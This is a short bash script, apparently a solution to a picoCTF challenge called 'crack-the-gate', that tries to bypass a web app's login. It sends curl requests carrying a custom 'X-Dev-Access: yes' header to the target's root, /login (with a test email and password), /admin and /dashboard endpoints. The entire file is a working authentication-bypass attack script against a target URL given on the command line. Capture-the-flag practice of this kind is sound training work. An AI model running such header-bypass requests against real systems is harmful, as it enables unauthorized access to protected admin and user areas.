#!/bin/bash

# ===== picoCTF Header Bypass Script =====
# Usage: ./crack-the-gate.sh http://TARGET:PORT

TARGET="$1"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target-url>"
    exit 1
fi

echo "================================"
echo "[+] Target: $TARGET"
echo "[+] Attempting dev bypass..."
echo "================================"

HEADER="X-Dev-Access: yes"

echo ""
echo "[+] Testing root endpoint..."
curl -s -H "$HEADER" "$TARGET"
echo -e "\n"

echo "[+] Testing /login endpoint..."
curl -s -H "$HEADER" \
     -H "Content-Type: application/json" \
     -d '{"email":"ctf-player@picoctf.org","password":"test"}' \
     "$TARGET/login"
echo -e "\n"

echo "[+] Testing /admin endpoint..."
curl -s -H "$HEADER" "$TARGET/admin"
echo -e "\n"

echo "[+] Testing /dashboard endpoint..."
curl -s -H "$HEADER" "$TARGET/dashboard"
echo -e "\n"

echo "================================"
echo "Finished."
echo "================================"
